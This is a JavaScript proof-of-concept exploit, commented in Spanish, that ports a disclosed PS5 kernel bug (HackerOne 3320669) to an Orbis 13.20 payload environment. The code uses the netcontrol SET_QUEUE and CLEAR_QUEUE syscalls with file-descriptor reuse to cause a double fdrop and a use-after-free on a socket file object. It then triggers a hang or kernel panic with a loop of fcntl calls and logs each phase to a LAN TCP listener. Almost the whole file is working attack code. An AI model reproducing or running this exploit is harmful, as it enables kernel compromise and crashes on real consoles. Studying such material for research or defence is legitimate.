// 2026-08-28 netcontrol_poc_1320: PoC del double-fdrop de netcontrol (HackerOne 3320669, slidybat, PS5, high/$10k, divulgado 2026-05-01) portado a Y2JB Orbis 13.20
// Bug: NETEVENT_SET_QUEUE(0x20000003) toma referencia del socket via getsock_cap y la guarda en el netevent; NETEVENT_CLEAR_QUEUE(0x20000007) hace fdrop buscando el netevent por NUMERO DE FD (no por puntero). close(s1)+socket()->fd reutilizado=s2 => el clear hace fdrop sobre s2 (que nunca tuvo la referencia) => refcnt del file de s2 a 0 con el fdtable aun apuntandolo = UAF de file object; en PS5 fcntl(F_SETFL) sobre s2 llama fget() => hang (o crash). https://hackerone.com/reports/3320669
// Syscall: netcontrol = Orbis 0x063 (playbook L16; kstuff-13/lib/syscalls.txt:79 "netcontrol __sys_netcontrol"), args (if_index,cmd,buf,buflen); fcntl=SYSCALL.fcntl=0x5C, F_SETFL=4 (kstuff-13/freebsd-headers/sys/fcntl.h:213).
// Fases: 0 reachability(SET_QUEUE sobre s1) -> 1 double-fdrop(close s1 + socket s2 con fd-reuse VERIFICADO + CLEAR_QUEUE sobre s2) -> 2 trigger fcntl(F_SETFL) x100 sobre s2 (hang/panic = UAF CONFIRMADO) -> 3 post-mortem solo si consola viva. Canal: TCP crudo a 192.168.1.67:8081 (idiéntico diag_raw3/p10).
(()=>{
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x),WB=malloc(512);let sock=-1n;
const SYS_NETCONTROL=0x63n,SET_QUEUE=0x20000003n,CLEAR_QUEUE=0x20000007n,F_SETFL=4n,EPERM=1;
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const R=(n,v)=>W("[netctl] FASE "+n+" result: "+v);
const N=(s)=>{try{send_notification(s)}catch(e){}};
const EN=()=>{try{const m=/^(\d+)/.exec(get_error_string());return m?parseInt(m[1],10):-1}catch(e){return -1}};
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);const cr=I(syscall(SYSCALL.connect,sock,sa,16n));if(cr<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
W("[netctl] PoC double-fdrop H1-3320669 inicio (canal "+(sock>=0n?"OK":"MUERTO")+")");
const DONE=(v)=>{W("[netctl] PAYLOAD DONE");if(v)N(v.slice(0,90));if(sock>=0n)syscall(SYSCALL.close,sock)};
// FASE 0 - reachability: socket s1 + netcontrol(SET_QUEUE). Si el sandbox lo deja pasar, el netevent path esta vivo (HITO MAYOR).
let fd1=-1n,r0=0n,e0=0n;
try{
W("[netctl] FASE 0: socket(AF_INET,SOCK_STREAM,0) -> s1");
fd1=I(syscall(SYSCALL.socket,2n,1n,0n));
if(fd1<0n){W("[netctl] FASE 0 ABORT: socket fallo fd="+fd1);DONE("[netctl] ABORT fase 0: socket fallo");return}
W("[netctl] FASE 0: s1 fd="+fd1);
const buf=malloc(8);write64(buf,B(fd1)); // el PoC pasa &s1: fd como int64 en el buf
W("[netctl] FASE 0 pre: netcontrol(0,SET_QUEUE=0x20000003,&s1="+fd1+",8)");
r0=I(syscall(SYS_NETCONTROL,0n,SET_QUEUE,buf,8n));
if(r0<0)e0=EN();
R(0,"netcontrol SET_QUEUE ret="+r0+(r0<0?" errno="+e0:""));
}catch(e){W("[netctl] FASE 0 EX: "+e+" - netcontrol vetado desde sandbox - bug inalcanzable");DONE("[netctl] vetado: bug inalcanzable");return}
if(r0<0n){W("[netctl] netcontrol vetado desde sandbox ("+(e0===EPERM?"EPERM":"errno="+e0)+") - bug inalcanzable");DONE("[netctl] vetado errno="+e0+": bug inalcanzable");return}
W("[netctl] FASE 0 OK: netevent SET aceptado");N("[netctl] FASE 0 OK: netevent SET aceptado");
// FASE 1 - double fdrop: close(s1), socket() esperando REUTILIZACION del fd, CLEAR_QUEUE sobre el fd reutilizado.
let fd2=-1n;
try{
W("[netctl] FASE 1 pre: close(s1="+fd1+")");
syscall(SYSCALL.close,fd1);
W("[netctl] FASE 1 pre: socket() de nuevo -> s2");
fd2=I(syscall(SYSCALL.socket,2n,1n,0n));
W("[netctl] FASE 1: fd_s1="+fd1+" fd_s2="+fd2);
if(fd2<0n){W("[netctl] FASE 1 ABORT: socket s2 fallo fd="+fd2);DONE("[netctl] ABORT fase 1: socket fallo");return}
if(fd2!==fd1){W("[netctl] fd NO reutilizado (el kernel asigno otro: "+fd2+" != "+fd1+") - el PoC requiere match; ABORT con datos (SET_QUEUE pendiente sobre s1 cerrado)");DONE("[netctl] ABORT: fd no reutilizado");return}
W("[netctl] fd reutilizado OK (match, s2="+fd2+")");
const buf2=malloc(8);write64(buf2,B(fd2));
W("[netctl] FASE 1 pre: netcontrol(0,CLEAR_QUEUE=0x20000007,&s2="+fd2+",8)");
const r1=I(syscall(SYS_NETCONTROL,0n,CLEAR_QUEUE,buf2,8n));
const e1=r1<0?EN():0;
R(1,"netcontrol CLEAR_QUEUE ret="+r1+(r1<0?" errno="+e1:""));
if(r1<0n)W("[netctl] CLEAR_QUEUE rechazo errno="+e1+" - doble fdrop probablemente NO ejecutado (fase 2 solo diagnostica)");
// Estado tras esto: el file de s2 con refcnt corrompido (doble fdrop) — UAF latente.
W("[netctl] FASE 1: double-fdrop ejecutado - estado UAF vivo");N("[netctl] FASE 1: double-fdrop ejecutado — estado UAF vivo");
}catch(e){W("[netctl] FASE 1 EX: "+e);DONE("[netctl] ABORT fase 1 EX");return}
// FASE 2 - trigger (PELIGROSA): fcntl(s2,F_SETFL,0) x100. En PS5 fcntl->fget() sobre file con refcnt=0 => hang (última línea marca hasta dónde) o panic (ídem via log). Bucle acotado, W cada 10.
N("[netctl] FASE 2: fcntl F_SETFL x100 — hang/crash esperado = UAF confirmado");
W("[netctl] FASE 2 pre: inicio bucle fcntl(fd="+fd2+",F_SETFL=4,0) x100");
let vivos=0;
try{for(let k=1;k<=100;k++){syscall(SYSCALL.fcntl,fd2,F_SETFL,0n);vivos=k;if(k%10===0)W("[netctl] fcntl x"+k+" ok")}}catch(e){W("[netctl] FASE 2 EX en iteracion "+vivos+": "+e)}
if(vivos>=100)W("[netctl] FASE 2 SIN efecto (parcheado?)");
// FASE 3 - post-mortem (solo si seguimos vivos): NO se cierra s2 (no closes extra sobre el file UAF).
let pid="?";try{pid=I(syscall(SYSCALL.getpid))}catch(e){}
W("[netctl] COMPLETO: consola viva tras fcntl x100 - comportamiento inesperado, documentar (pid="+pid+", fcntls="+vivos+")");
DONE("[netctl] COMPLETO: viva tras fcntl x100 — documentar");
})();
